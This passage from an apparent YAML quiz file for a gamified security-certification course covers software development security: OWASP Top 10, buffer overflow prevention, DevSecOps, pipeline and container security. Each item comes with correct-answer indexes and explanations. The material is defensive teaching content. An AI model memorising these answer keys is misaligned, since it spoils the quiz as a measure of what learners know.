        \ process.\"\n\n\"TIER 1: Every PR runs through automated SAST (Static Application Security Testing).\n\
        This catches common vulnerabilities instantly - SQL injection, XSS, hardcoded\nsecrets, vulnerable\
        \ dependencies. Developers get immediate feedback.\"\n\n\"TIER 2: PRs are risk-categorized. Changes\
        \ to authentication, authorization,\npayment processing, or PII handling require MANUAL security\
        \ review. Everything\nelse proceeds with automated approval.\"\n\n\"TIER 3: We randomly sample\
        \ 10% of auto-approved changes for manual review.\nThis catches what automation misses and helps\
        \ us tune our tools.\"\n\nThe CISO asks, \"What about the backlog?\"\n\n\"It disappears. 80% of\
        \ PRs are low-risk and can proceed with automated approval.\nSecurity focuses on the 20% that\
        \ actually need human review. We're faster AND\nmore thorough.\"\n\nYou have demonstrated efficient\
        \ SECURITY CODE REVIEW practices.\n                "
      failure_texts:
        0: "\nSkipping security review for velocity is how breaches happen. The time \"saved\"\nby not\
          \ reviewing code is nothing compared to incident response, breach notification,\nregulatory\
          \ fines, and reputation damage. The solution is EFFICIENT review\nprocesses - automated tools\
          \ plus targeted manual review - not no review.\n                    "
        2: "\nPost-incident review is too late. By the time you're reviewing after a breach,\ncustomers\
          \ are compromised, data is stolen, and you're in crisis mode. Security\nreview must happen BEFORE\
          \ deployment. Learn from incidents, yes, but prevent\nthem through proactive review.\n     \
          \               "
        3: "\nSelf-review has limited value. Developers miss their own blind spots. They\nmake the same\
          \ assumptions in review that they made in coding. Different\nperspectives catch different issues.\
          \ Security review should involve someone\nother than the code author - whether that's a peer\
          \ developer or security\nspecialist.\n                    "
- id: d8_owasp_guidance
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - OWASP Top 10'
  failure_text: "\nThe OWASP Top 10 is the industry-standard awareness document for web application\n\
    security. It lists the most critical security risks based on real-world data\nfrom the security community.\
    \ Categories include Injection, Broken Authentication,\nSensitive Data Exposure, XXE, Broken Access\
    \ Control, Security Misconfiguration,\nXSS, Insecure Deserialization, Vulnerable Components, and Insufficient\
    \ Logging.\nEvery web developer should understand and address these risks.\n        "
  themes:
    fantasy:
      title: THE MASTER'S REFERENCE
      narrative: "\nA group of apprentice spellcasters approach you. \"Master, we've been tasked\nwith\
        \ securing the kingdom's new magical web portal. We know there are common\nvulnerabilities we\
        \ should address, but we don't know where to start.\"\n\nOne apprentice holds up the kingdom's\
        \ style guide. Another waves the arcane\nlanguage documentation. A third suggests consulting the\
        \ crystal orb vendor.\n\nWhere should apprentices FIRST look for guidance on the most critical\
        \ web\napplication security risks?\n                "
      choices:
      - text: The kingdom's internal style guide
      - text: The OWASP Top 10 - industry consensus on critical web risks
      - text: The programming language documentation
      - text: The database vendor's manual
      success_text: "\n\"Your first reference,\" you tell the apprentices, \"should be the OWASP Top 10.\"\
        \n\nYou summon a glowing scroll that materializes in the air. \"OWASP - the Open\nWeb Application\
        \ Security Project - maintains a consensus list of the most\ncritical security risks facing web\
        \ applications. It's updated regularly based\non real-world data from security practitioners worldwide.\"\
        \n\nThe apprentices crowd around to read: \"Broken Access Control... Cryptographic\nFailures...\
        \ Injection... Insecure Design...\"\n\n\"These ten categories represent the most common and dangerous\
        \ vulnerabilities.\nAddress these first, and you've prevented the vast majority of attacks.\"\n\
        \n\"But what about our style guide?\" one asks.\n\n\"Internal guides may address coding standards\
        \ but rarely cover security\ncomprehensively. The OWASP Top 10 is specifically focused on security\
        \ risks.\nStart there, then supplement with internal standards.\"\n\nYou have directed the apprentices\
        \ to the OWASP TOP 10 as essential guidance.\n                "
      failure_texts:
        0: "\nInternal style guides focus on code consistency, formatting, and project\nconventions. They\
          \ rarely provide comprehensive security guidance. While\ninternal standards are valuable, the\
          \ OWASP Top 10 specifically addresses\nthe most critical web application security risks based\
          \ on industry-wide\ndata. For security guidance, start with OWASP.\n                    "
        2: "\nProgramming language documentation explains language features and syntax.\nIt doesn't comprehensively\
          \ address application security vulnerabilities.\nLanguages may have security features, but understanding\
          \ common attack\npatterns requires security-focused resources like the OWASP Top 10.\n     \
          \               "
        3: "\nDatabase vendor manuals explain database features and administration. They\ncover database-specific\
          \ security but not application-layer vulnerabilities\nlike XSS, authentication flaws, or business\
          \ logic issues. The OWASP Top 10\nprovides a comprehensive view of web application security\
          \ risks.\n                    "
    corporate:
      title: THE TRAINING CURRICULUM
      narrative: "\nYou're developing security training for the development team. A junior developer\n\
        asks: \"What's the most important thing we should learn about web application\nsecurity?\"\n\n\
        The team lead suggests: \"Just follow our internal coding standards - that should\nbe enough.\"\
        \n\nThe DBA adds: \"Focus on database security - that's where the data is.\"\n\nA senior developer\
        \ waves the Python documentation: \"Just use the language\nfeatures correctly.\"\n\nWhere should\
        \ developers FIRST look for guidance on the most common and critical\nweb application security\
        \ vulnerabilities?\n                "
      choices:
      - text: Follow only the company's internal coding standards
      - text: Study the OWASP Top 10 - the industry standard for web security risks
      - text: Read the programming language documentation
      - text: Focus only on database security
      success_text: "\n\"The foundation of web security training is the OWASP Top 10,\" you explain.\n\
        \nYou pull up the OWASP website. \"This list represents the security community's\nconsensus on\
        \ the most critical risks. It's based on real vulnerability data\nfrom hundreds of organizations.\"\
        \n\nYou walk through the categories: \"Injection, Broken Authentication, Sensitive\nData Exposure,\
        \ XXE, Broken Access Control... These aren't theoretical - they're\nthe vulnerabilities that actually\
        \ get exploited.\"\n\nThe team lead asks, \"But we have internal standards...\"\n\n\"Internal\
        \ standards are good for consistency. But do they cover every OWASP\ncategory? Are they updated\
        \ when threats change? The OWASP Top 10 provides a\ncomprehensive, current baseline. Build internal\
        \ standards ON TOP of OWASP,\nnot instead of it.\"\n\nYou make the OWASP Top 10 required reading\
        \ for all developers.\n\nYou have directed developers to the OWASP TOP 10 as essential guidance.\n\
        \                "
      failure_texts:
        0: "\nInternal coding standards rarely provide comprehensive security guidance.\nThey focus on\
          \ style, architecture, and project conventions. Security requires\nspecific knowledge of attack\
          \ patterns and defenses. The OWASP Top 10 provides\nthis specifically - a regularly updated\
          \ consensus of the most critical web\napplication security risks.\n                    "
        2: "\nLanguage documentation explains syntax and features, not application security.\nPython docs\
          \ won't teach you about XSS. JavaScript docs won't explain CSRF.\nSecurity requires security-focused\
          \ education. The OWASP Top 10 is specifically\ndesigned to teach developers about real-world\
          \ web vulnerabilities.\n                    "
        3: "\nDatabase security is important but incomplete. SQL injection is one risk among\nmany. What\
          \ about XSS? Broken authentication? Insecure direct object references?\nComprehensive web security\
          \ requires understanding ALL major risk categories.\nThe OWASP Top 10 provides this breadth.\n\
          \                    "
- id: d8_buffer_overflow
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Buffer Overflow Prevention'
  failure_text: "\nBuffer overflow occurs when data written to a buffer exceeds its allocated size,\n\
    overwriting adjacent memory. This can corrupt data, crash applications, or allow\ncode execution.\
    \ Prevention requires: (1) BOUNDS CHECKING before copying data,\n(2) SAFE STRING FUNCTIONS that enforce\
    \ limits (strncpy vs strcpy), (3) COMPILER\nPROTECTIONS like stack canaries and ASLR, and (4) SAFER\
    \ LANGUAGES where possible.\nNever trust input length - always validate before copying.\n        "
  themes:
    fantasy:
      title: THE OVERFILLED VESSEL
      narrative: "\nThe Citadel's message processing crystal can hold exactly 100 runes per message.\n\
        When a mage submits a message, the crystal copies it into the processing chamber.\n\nYesterday,\
        \ an attacker sent a message of 150 runes. The extra 50 runes overflowed\ninto the adjacent CONTROL\
        \ CHAMBER, rewriting the crystal's command instructions.\nThe crystal began executing the attacker's\
        \ commands instead of its intended function.\n\nYou're reviewing the crystal's design. What vulnerability\
        \ is this, and what is\nthe BEST prevention approach?\n                "
      choices:
      - text: Memory leak - add garbage collection
      - text: Buffer overflow - implement bounds checking
      - text: Race condition - add synchronization locks
      - text: Integer overflow - use larger number types
      success_text: "\n\"This is a BUFFER OVERFLOW,\" you explain to the crystal artificers. \"The message\n\
        buffer holds 100 runes. When we copied 150 runes without checking the count,\nthe extra 50 overwrote\
        \ adjacent memory - in this case, the control instructions.\"\n\nYou demonstrate the fix: \"Before\
        \ copying ANY data, we must CHECK THE LENGTH.\nIf the input exceeds our buffer, we either reject\
        \ it or truncate it safely.\"\n\nYou show the corrected spell:\n\"IF message_length > buffer_size\
        \ THEN reject_message\"\n\"ELSE safe_copy(message, buffer, buffer_size)\"\n\n\"Additionally, we\
        \ should use SAFE COPY functions that always respect boundaries,\nand enable STACK PROTECTION\
        \ enchantments that detect overflow attempts.\"\n\nThe artificer asks, \"Can't we just make the\
        \ buffer bigger?\"\n\n\"No. An attacker will just send bigger messages. The fix is CHECKING BOUNDS,\n\
        not increasing limits.\"\n\nYou have demonstrated BUFFER OVERFLOW PREVENTION through bounds checking.\n\
        \                "
      failure_texts:
        0: "\nMemory leaks are resource exhaustion issues where memory isn't freed. This\nattack corrupts\
          \ memory by writing beyond allocated boundaries - a buffer\noverflow. Different vulnerability,\
          \ different fix. Buffer overflows require\nbounds checking, not garbage collection.\n      \
          \              "
        2: "\nRace conditions occur when timing between operations creates vulnerabilities.\nThis attack\
          \ is about writing more data than a buffer can hold. There's no\ntiming issue - just failure\
          \ to check input length against buffer size.\nBounds checking is the fix, not synchronization\
          \ locks.\n                    "
        3: "\nInteger overflows occur when numeric values exceed their type limits and wrap\naround. This\
          \ attack writes too much data into a fixed-size buffer. The numbers\naren't overflowing - the\
          \ buffer is. Bounds checking before copying is the fix.\n                    "
    corporate:
      title: THE LEGACY APPLICATION
      narrative: "\nThe security scan flagged a critical vulnerability in a legacy C application.\nWhen\
        \ processing user-supplied input, the application uses strcpy() to copy\ndata into a fixed-size\
        \ buffer without checking the input length.\n\nAn attacker sent a specially crafted 500-character\
        \ input to a 100-character\nbuffer. The extra 400 characters overwrote the return address on the\
        \ stack,\nredirecting execution to attacker-supplied code.\n\nThe application has been running\
        \ for 15 years. \"It's never been a problem,\"\nsays the developer. \"Why fix it now?\"\n\nWhat\
        \ vulnerability is this, and what is the BEST fix?\n                "
      choices:
      - text: Memory leak - implement garbage collection
      - text: Buffer overflow - use bounds checking and safe string functions
      - text: Race condition - add thread synchronization
      - text: Integer overflow - use 64-bit integers instead of 32-bit
      success_text: "\n\"This is a classic stack buffer overflow,\" you explain. \"strcpy() copies until\n\
        it hits a null terminator. It doesn't check if the destination buffer is big\nenough. An attacker\
        \ exploits this to overwrite the return address and execute\narbitrary code.\"\n\nYou show the\
        \ fix: \"Replace strcpy() with strncpy() or strlcpy() - functions\nthat enforce maximum lengths.\
        \ Or better, use safer languages and libraries\nthat prevent this class of vulnerability entirely.\"\
        \n\nYou demonstrate:\n\"strcpy(buf, input);  // DANGEROUS - no bounds check\"\n\"strncpy(buf,\
        \ input, sizeof(buf)-1);  // SAFER - enforces limit\"\n\"buf[sizeof(buf)-1] = '\\0';  // Ensure\
        \ null termination\"\n\n\"Additionally, enable compiler protections: stack canaries, ASLR, DEP.\
        \ These\nmake exploitation harder even if overflows occur.\"\n\nThe developer grumbles but implements\
        \ the fix. The 15-year-old vulnerability\nis finally closed.\n\nYou have demonstrated BUFFER OVERFLOW\
        \ PREVENTION through bounds checking.\n                "
      failure_texts:
        0: "\nMemory leaks are resource issues (memory not freed). Buffer overflows are\nsecurity vulnerabilities\
          \ (data exceeding buffer boundaries). Different problems,\ndifferent fixes. Buffer overflows\
          \ require bounds checking, not garbage collection.\n                    "
        2: "\nRace conditions involve timing issues between concurrent operations. Buffer\noverflows involve\
          \ writing more data than a buffer can hold. No timing is\ninvolved in this vulnerability. The\
          \ fix is bounds checking, not synchronization.\n                    "
        3: "\nInteger overflow involves numeric values exceeding type limits. Buffer overflow\ninvolves\
          \ data exceeding allocated memory. Different vulnerability classes.\nBuffer overflows are fixed\
          \ by bounds checking, not integer type changes.\n                    "
- id: d8_devsecops
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - DevSecOps'
  failure_text: "\nDevSecOps integrates security into DevOps practices and culture. Key principles:\n\
    (1) SHIFT LEFT - involve security from requirements through design and development,\n(2) AUTOMATE\
    \ - security testing in CI/CD pipelines for immediate feedback,\n(3) COLLABORATE - security as a partner,\
    \ not a gate, with embedded expertise,\n(4) SHARED RESPONSIBILITY - security is everyone's job, not\
    \ just the security team.\nThis replaces adversarial \"security as blocker\" with collaborative \"\
    security as enabler.\"\n        "
  themes:
    fantasy:
      title: THE DIVIDED GUILDS
      narrative: "\nThree guilds are responsible for magical artifact creation: the Crafters Guild\n(development),\
        \ the Protectors Guild (security), and the Keepers Guild (operations).\n\nRelations are... strained.\
        \ Crafters resent Protectors for blocking their creations.\nProtectors complain Crafters ignore\
        \ security. Keepers blame both when artifacts\nfail in production.\n\n\"Security is a bottleneck!\"\
        \ shouts the Crafter leader.\n\"Developers don't care about security!\" retorts the Protector\
        \ chief.\n\"Neither of you cares about reliability!\" adds the Keeper master.\n\nThe Council asks\
        \ you to propose a better approach. What organizational change\nwould BEST address these conflicts?\n\
        \                "
      choices:
      - text: Give the Protectors Guild veto power over all releases
      - text: Integrate security into crafting and operations through shared responsibility
      - text: Remove the Protectors Guild from the release process entirely
      - text: Only involve the Protectors Guild after artifact incidents
      success_text: "\n\"The problem,\" you explain, \"is that security is treated as a separate GATE\n\
        rather than an integral PART of creation. Let me propose a new model.\"\n\n\"Instead of Protectors\
        \ reviewing finished artifacts, embed Protector apprentices\nin Crafter teams. They participate\
        \ in design. They review during creation, not\nafter. They share knowledge. Security becomes everyone's\
        \ responsibility.\"\n\n\"But how do we ensure security is actually done?\" asks the Protector\
        \ chief.\n\n\"Automated scanning enchantments check every artifact automatically. Protectors\n\
        define the rules; enchantments enforce them. Protectors focus on complex risks\nrather than routine\
        \ checks.\"\n\n\"Keepers get visibility into both security and crafting decisions. Artifacts\n\
        are designed for reliable operation from the start.\"\n\nThe Council nods. \"So instead of fighting\
        \ over releases...\"\n\n\"Everyone collaborates throughout. Security is built in, not bolted on.\
        \ That's\nthe unity of purpose.\"\n\nYou have demonstrated DEVSECOPS principles of integrated\
        \ security.\n                "
      failure_texts:
        0: "\nVeto power perpetuates adversarial relationships. Crafters will work around\nProtectors\
          \ rather than with them. The goal is collaboration and shared\nresponsibility, not concentrated\
          \ power. Security should be a partner in\ncreation, not a final judge who can only say \"no.\"\
          \n                    "
        2: "\nRemoving security from releases doesn't make security go away - it makes it\nABSENT. Without\
          \ security involvement, vulnerabilities will reach production.\nThe answer isn't removing security;\
          \ it's integrating it earlier and more\ncollaboratively so it doesn't block releases.\n    \
          \                "
        3: "\nPost-incident involvement is reactive and expensive. By the time an incident\noccurs, damage\
          \ is done. Security must be involved throughout the process,\npreventing issues rather than\
          \ only responding to them. DevSecOps integrates\nsecurity from the start.\n                \
          \    "
    corporate:
      title: THE SECURITY BLOCKER
      narrative: "\nThe weekly release meeting is tense. Development has features ready to ship.\nSecurity\
        \ is blocking the release due to vulnerabilities. Operations is angry\nat everyone for the delay.\n\
        \n\"Security always blocks us!\" the Dev Manager complains. \"We can't ship anything!\"\n\"You\
        \ keep writing insecure code!\" the Security Lead fires back.\n\"Neither of you tests in production!\"\
        \ adds the Ops Manager.\n\nThis conflict has persisted for months. Releases are delayed. Teams\
        \ don't trust\neach other. The CISO asks you to propose a cultural and process change.\n\nWhat\
        \ approach would BEST address these organizational challenges?\n                "
      choices:
      - text: Give the security team veto power over all releases
      - text: Implement DevSecOps - integrate security into development and operations
      - text: Remove security from the release process
      - text: Only involve security after production incidents
      success_text: "\n\"The problem is organizational,\" you explain. \"Security sits at the end as a\n\
        gate. By the time issues are found, it's too late to fix them efficiently.\nDevSecOps changes\
        \ this model.\"\n\nYou outline the transformation:\n\"1. SHIFT LEFT: Security requirements during\
        \ planning. Threat modeling during\ndesign. Security training for developers. Issues found EARLY\
        \ when cheap to fix.\"\n\n\"2. AUTOMATE: SAST/DAST in CI/CD pipelines. Developers get immediate\
        \ feedback.\nNo waiting for manual security review on routine issues.\"\n\n\"3. COLLABORATE: Security\
        \ engineers embedded in dev teams. Shared responsibility.\nSecurity as an enabler, not a blocker.\"\
        \n\n\"4. MEASURE: Security metrics visible to everyone. Improvement over time. No\nsurprises at\
        \ release time.\"\n\nThe CISO asks, \"How does this help ops?\"\n\n\"Infrastructure as code. Security\
        \ scanning of configurations. Production security\nis everyone's concern, built in from the start.\"\
        \n\nYou have demonstrated DEVSECOPS principles of integrated security.\n                "
      failure_texts:
        0: "\nVeto power intensifies the adversarial dynamic. Development will resent security\neven more.\
          \ The goal is collaboration and shared ownership, not concentrated\nblocking power. DevSecOps\
          \ makes security a partner in development, not a final\nbarrier to be circumvented.\n      \
          \              "
        2: "\nRemoving security from releases doesn't solve anything - it just removes the\nsafety net.\
          \ Vulnerabilities will ship to production unchecked. The answer is\nintegrating security earlier\
          \ (shift left) so it's not a last-minute blocker,\nnot removing it entirely.\n             \
          \       "
        3: "\nPost-incident involvement is the most expensive approach. Breaches cost orders\nof magnitude\
          \ more than prevention. DevSecOps integrates security throughout the\npipeline so issues are\
          \ caught early, not after production incidents cause damage.\n                    "
- id: d8_pipeline_attack
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - CI/CD Pipeline Security'
  failure_text: "\nSupply chain attacks target the software build and distribution process rather\nthan\
    \ the final product. By compromising CI/CD pipelines, attackers can inject\nmalicious code into every\
    \ application built through that pipeline. Defense\nrequires: (1) PROTECTING build infrastructure\
    \ as critical assets, (2) SIGNING\nbuild artifacts for integrity verification, (3) REPRODUCIBLE builds\
    \ where the\nsame source always produces the same output, and (4) MONITORING for unauthorized\npipeline\
    \ changes.\n        "
  themes:
    fantasy:
      title: THE CORRUPTED FORGE
      narrative: "\nThe Citadel's Artifact Forge automatically combines raw materials, enchantments,\n\
        and binding spells to produce magical items. Thousands of artifacts flow through\ndaily.\n\nYesterday,\
        \ investigators discovered that a dark mage compromised the forge's\nbinding spell templates.\
        \ Every artifact produced in the last month contains a\nhidden curse - a backdoor that activates\
        \ on command.\n\n\"But we checked the raw materials and the final artifacts!\" protests the Forge\n\
        Master. \"They all passed inspection!\"\n\nWhere was the true attack vector, and what type of\
        \ attack is this?\n                "
      choices:
      - text: This is SQL injection targeting the artifact database
      - text: This is a supply chain / pipeline attack on the build process
      - text: This is a denial of service attack
      - text: This is a phishing attack targeting forge workers
      success_text: "\n\"The attack was brilliantly subtle,\" you explain. \"They didn't tamper with\n\
        individual artifacts or raw materials. They compromised the FORGE ITSELF -\nthe build process\
        \ that creates artifacts.\"\n\n\"By modifying the binding spell templates, every artifact that\
        \ passed through\nthe forge was automatically cursed. Individual inspection couldn't detect this\n\
        because the curse was added DURING PRODUCTION, not before or after.\"\n\nThe Forge Master pales.\
        \ \"So thousands of artifacts...\"\n\n\"All compromised. This is a SUPPLY CHAIN attack - targeting\
        \ the development\npipeline rather than individual products. It's devastating because one compromise\n\
        affects everything that flows through.\"\n\n\"How do we prevent this?\"\n\n\"Integrity verification\
        \ of all build components. Signed templates. Immutable\nbuild environments. Detection of unauthorized\
        \ changes. The forge itself must\nbe as protected as its outputs.\"\n\nYou have identified a SUPPLY\
        \ CHAIN / PIPELINE ATTACK.\n                "
      failure_texts:
        0: "\nSQL injection targets database queries. This attack targeted the build pipeline.\nNo database\
          \ manipulation was involved - the attacker modified the build process\nitself. This is supply\
          \ chain compromise, a different and often more devastating\nattack vector.\n               \
          \     "
        2: "\nDenial of service prevents access to services. This attack added malicious\nfunctionality\
          \ without disrupting production. In fact, the forge worked perfectly -\ntoo perfectly, silently\
          \ adding backdoors to everything it produced. Supply chain\nattacks are about compromising output,\
          \ not preventing it.\n                    "
        3: "\nPhishing targets humans through deceptive communications. This attack targeted\nthe build\
          \ infrastructure itself. While the initial access might have involved\nphishing, the actual\
          \ vulnerability was the compromised build pipeline. Supply\nchain security addresses this vector.\n\
          \                    "
    corporate:
      title: THE COMPROMISED JENKINS
      narrative: "\nYour security team discovers a nightmare scenario. An attacker gained access to\n\
        the CI/CD Jenkins server and modified build scripts. Every application built in\nthe last six\
        \ weeks contains a backdoor that exfiltrates data.\n\n\"But we code review everything!\" the Dev\
        \ Manager protests. \"We scan our code!\"\n\"The code was clean,\" the Security Lead confirms.\
        \ \"The backdoor was added DURING\nthe build process, not in source code.\"\n\nThousands of customers\
        \ are running compromised software. The applications passed\nall security scans because the malicious\
        \ code wasn't in the repository.\n\nWhat type of attack is this?\n                "
      choices:
      - text: SQL injection attack
      - text: Supply chain / CI/CD pipeline attack
      - text: Denial of service attack
      - text: Phishing attack
      success_text: "\n\"This is a supply chain attack targeting our CI/CD pipeline,\" you explain.\n\"\
        The attacker didn't need to compromise our source code - they compromised\nthe BUILD PROCESS that\
        \ turns source code into deployable software.\"\n\nYou diagram the attack: \"Source code goes\
        \ in clean. The build script adds\nmalicious code. The output contains the backdoor. Code review\
        \ can't catch it\nbecause the malicious code isn't in the repository.\"\n\n\"This is why SolarWinds\
        \ was so devastating. Orion's source code was clean.\nThe build system was compromised. Every\
        \ customer who updated got the backdoor.\"\n\nThe CTO asks, \"How do we prevent this?\"\n\n\"\
        Multiple controls: Verified, immutable build environments. Signed build artifacts.\nBuild reproducibility\
        \ - same source should produce identical binaries. Pipeline\nas code with strict change control.\
        \ Integrity monitoring of build infrastructure.\"\n\nYou initiate a full rebuild from trusted\
        \ infrastructure and customer notification.\n\nYou have identified a SUPPLY CHAIN / PIPELINE ATTACK.\n\
        \                "
      failure_texts:
        0: "\nSQL injection targets database queries in applications. This attack targeted\nthe build\
          \ pipeline that produces applications. The vulnerability wasn't in any\nquery - it was in the\
          \ build infrastructure itself. Different attack vector,\ndifferent defense.\n              \
          \      "
        2: "\nDenial of service prevents access to services. This attack added malicious\nfunctionality\
          \ without disrupting the build process. The pipeline worked\nperfectly - that was the problem.\
          \ Supply chain attacks poison the well;\nthey don't stop it from flowing.\n                \
          \    "
        3: "\nPhishing might have been how the attacker initially gained access, but the\nactual attack\
          \ was compromising the CI/CD pipeline. The vulnerability was\ninadequate protection of build\
          \ infrastructure, not susceptibility to phishing.\nSupply chain security specifically addresses\
          \ build pipeline protection.\n                    "
- id: d8_container_security
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - Container Security'
  failure_text: "\nContainer security requires ongoing maintenance despite container isolation.\nKey practices:\
    \ (1) REGULARLY UPDATE base images - containers include operating\nsystem components that need patches,\
    \ (2) VULNERABILITY SCAN images in CI/CD\nbefore deployment, (3) RUN AS NON-ROOT - minimize privileges,\
    \ (4) ENABLE SECURITY\nFEATURES like seccomp and AppArmor, (5) USE MINIMAL IMAGES with only required\n\
    components. Isolation limits blast radius but doesn't eliminate vulnerabilities.\n        "
  themes:
    fantasy:
      title: THE SEALED VESSELS
      narrative: "\nThe Citadel uses enchanted vessels to contain and deploy magical services.\nEach vessel\
        \ is self-contained - everything the service needs is sealed inside\nat creation time.\n\nA security\
        \ audit reveals concerning findings: many vessels were created over a\nyear ago and haven't been\
        \ updated since. They contain old, vulnerable enchantments\nthat have since been patched in newer\
        \ versions.\n\n\"But the vessels are SEALED,\" the Vessel Master argues. \"They're isolated from\n\
        the outside world. Why would vulnerabilities in their contents matter?\"\n\nWhat is the flaw in\
        \ the Vessel Master's logic?\n                "
      choices:
      - text: Sealed vessels don't need patching because they're isolated
      - text: Vessels contain vulnerable components that need regular updates and scanning
      - text: Running vessels as root administrator makes them more secure
      - text: Disabling vessel security features improves performance without risk
      success_text: "\n\"Isolation is not invulnerability,\" you explain. \"Yes, vessels are sealed. But\n\
        they still process INPUT from outside. An attacker exploiting a vulnerability\nin a vessel's contents\
        \ can compromise that vessel and potentially pivot further.\"\n\nYou show examples: \"This vessel\
        \ contains an old messaging enchantment with a\nremote execution flaw. An attacker sends a crafted\
        \ message to the vessel's\nservice port. The vessel IS isolated - but the attacker now controls\
        \ it.\"\n\nThe Vessel Master considers. \"So we need to...\"\n\n\"REGULARLY UPDATE base enchantments.\
        \ SCAN vessels for known vulnerabilities\nbefore deployment. MONITOR for new vulnerabilities in\
        \ deployed vessels. USE\nminimal contents - only what the service actually needs.\"\n\n\"But rebuilding\
        \ vessels is work...\"\n\n\"Less work than incident response when a year-old vulnerability is\
        \ exploited.\nContainers aren't 'set and forget' - they require ongoing security maintenance.\"\
        \n\nYou have demonstrated CONTAINER SECURITY best practices.\n                "
      failure_texts:
        0: "\nIsolation doesn't eliminate vulnerabilities - it (partially) contains their\nimpact. A vulnerable\
          \ container can still be exploited through its exposed\nservices. Once compromised, attackers\
          \ may escape the container or use it\nas a foothold. Containers need regular updates just like\
          \ any other software.\n                    "
        2: "\nRunning containers as root INCREASES risk. If an attacker compromises a root\ncontainer,\
          \ they have maximum privileges. Container security best practices\ninclude running as non-root\
          \ users, using minimal privileges, and enabling\nsecurity features - the opposite of this advice.\n\
          \                    "
        3: "\nSecurity features exist for good reasons. Disabling them for performance gains\nis a dangerous\
          \ tradeoff. The performance improvement is usually minimal while\nthe security degradation is\
          \ significant. Keep security features enabled and\noptimize performance in other ways.\n   \
          \                 "
    corporate:
      title: THE ANCIENT CONTAINERS
      narrative: "\nThe DevOps team reviews their Docker container inventory. Concerning findings:\nmany\
        \ production containers use base images from two years ago. These images\ncontain known critical\
        \ vulnerabilities in OpenSSL, glibc, and other core\ncomponents.\n\n\"Containers are isolated!\"\
        \ the lead DevOps engineer argues. \"They can't affect\neach other. Why would we need to update\
        \ base images if the applications work?\"\n\nYou note that these containers expose services to\
        \ the internet and process\nuser-supplied data.\n\nWhat is the security concern the engineer is\
        \ missing?\n                "
      choices:
      - text: Containers don't need patching because they're isolated
      - text: Base images need regular updates and vulnerability scanning
      - text: Running containers as root improves security
      - text: Container security features should be disabled for performance
      success_text: "\n\"Isolation helps contain breaches, but it doesn't prevent them,\" you explain.\n\
        \"These containers expose web services. Attackers can send requests to those\nservices. If the\
        \ container's OpenSSL has a remote code execution vulnerability,\nan attacker can exploit it.\"\
        \n\nYou show the CVE list for the old base images: \"Log4Shell, multiple OpenSSL\nCVEs, glibc\
        \ buffer overflows... These are KNOWN vulnerabilities with public\nexploits. Anyone can download\
        \ the exploit code and target your containers.\"\n\n\"But updating images is disruptive...\"\n\
        \n\"Less disruptive than a breach. Here's what you need: (1) REGULAR base image\nupdates - rebuild\
        \ containers with current images. (2) VULNERABILITY SCANNING\nin your CI/CD pipeline - don't deploy\
        \ images with critical CVEs. (3) MONITORING\nof deployed containers for new vulnerabilities.\"\
        \n\nYou help them implement automated image scanning in their build pipeline.\n\nYou have demonstrated\
        \ CONTAINER SECURITY best practices.\n                "
      failure_texts:
        0: "\nContainer isolation is not invulnerability. Containers still process external\ninput through\
          \ their exposed services. Vulnerabilities in container components\ncan be exploited through\
          \ those services. Isolation may limit blast radius but\ndoesn't prevent the initial compromise.\
          \ Regular patching is essential.\n                    "
        2: "\nRunning as root INCREASES risk. If attackers compromise a root container, they\nhave maximum\
          \ privileges. Best practices include: run as non-root, drop\nunnecessary capabilities, use read-only\
          \ file systems where possible. Root\naccess makes exploitation more impactful, not less.\n \
          \                   "
        3: "\nDisabling security features trades real protection for marginal performance\ngains. Seccomp,\
          \ AppArmor, capability restrictions, and other container security\nfeatures exist to limit damage\
          \ from compromise. Keep them enabled. Optimize\nperformance through proper resource allocation\
          \ and efficient code.\n                    "
- id: d8_api_security
  domain: 8
  correct_index: 1
  xp_reward: 75
  hp_penalty: 25
  domain_reference: 'Domain 8: Software Development Security - API Security'
  failure_text: "\nAPI Security requires proper controls regardless of whether APIs are \"internal\"\n\
    or \"complex.\" Key controls: (1) AUTHENTICATION - verify the identity of every\nrequester (OAuth,\
    \ JWT, API keys), (2) AUTHORIZATION - check permissions for\nevery request, (3) RATE LIMITING - prevent\
    \ abuse and brute force, (4) INPUT\nVALIDATION - validate all input on the server, (5) ENCRYPTION\
    \ - use HTTPS.\nSecurity through obscurity (complex URLs, unlisted endpoints) provides no real\nprotection.\n\
    \        "
  themes:
    fantasy:
      title: THE UNGUARDED ORACLE
      narrative: "\nThe Citadel's Oracle provides information services to allied kingdoms. Any\nkingdom\
        \ can query the Oracle for knowledge by sending a properly formatted\nrequest.\n\nA security review\
        \ reveals concerning findings: the Oracle responds to ANY\nrequest from ANY source. There's no\
        \ verification of who's asking. Some queries\nreturn information that should be restricted to\
        \ specific kingdoms.\n\n\"The Oracle URLs are secret,\" the Oracle Keeper explains. \"Only allies\
        \ know how\nto phrase the queries.\"\n\nWhat security controls should the Oracle implement?\n\
        \                "
      choices:
      - text: Make the query URLs longer and harder to guess
      - text: Implement authentication, authorization, and rate limiting
      - text: Only use POST requests instead of GET
      - text: Add 'private' to the Oracle's name
      success_text: "\n\"Secret URLs are not security,\" you explain. \"They WILL be discovered. Attackers\n\
        monitor traffic. Allies get compromised. Query patterns are guessed.\"\n\nYou outline proper Oracle\
        \ security:\n\n\"AUTHENTICATION: Every request must prove identity. Sealed tokens. Signed\ncredentials.\
        \ The Oracle must VERIFY who is asking.\"\n\n\"AUTHORIZATION: Even authenticated kingdoms may\
        \ not access everything. Verify\neach requester has permission for the SPECIFIC information requested.\"\
        \n\n\"RATE LIMITING: Prevent abuse. No kingdom should query thousands of times per\nminute. Detect\
        \ and block unusual patterns.\"\n\n\"LOGGING: Record all queries. Detect misuse. Enable investigation.\"\
        \n\nThe Oracle Keeper nods. \"So obscurity is not security...\"\n\n\"Precisely. Security through\
        \ obscurity fails as soon as the secret is known.\nProper controls work regardless of what attackers\
        \ know about your system.\"\n\nYou have demonstrated proper API SECURITY controls.\n         \
        \       "
      failure_texts:
        0: "\nURL obscurity is not security. Attackers discover URLs through traffic analysis,\nOSINT,\
